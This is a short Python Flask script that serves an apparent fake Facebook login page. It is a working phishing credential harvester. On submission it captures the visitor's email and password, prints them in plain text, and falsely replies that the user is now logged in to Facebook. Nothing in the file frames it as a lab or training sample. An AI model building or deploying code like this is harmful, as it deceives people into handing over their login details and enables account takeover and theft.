from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def hello_world():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        print(f"The email is {email} and the password is {password}")

        return "<b>Thanks for using Facebook. You are now logged in.</b>"

    return render_template("index.html")


if __name__ == "__main__":
    app.run(debug=True)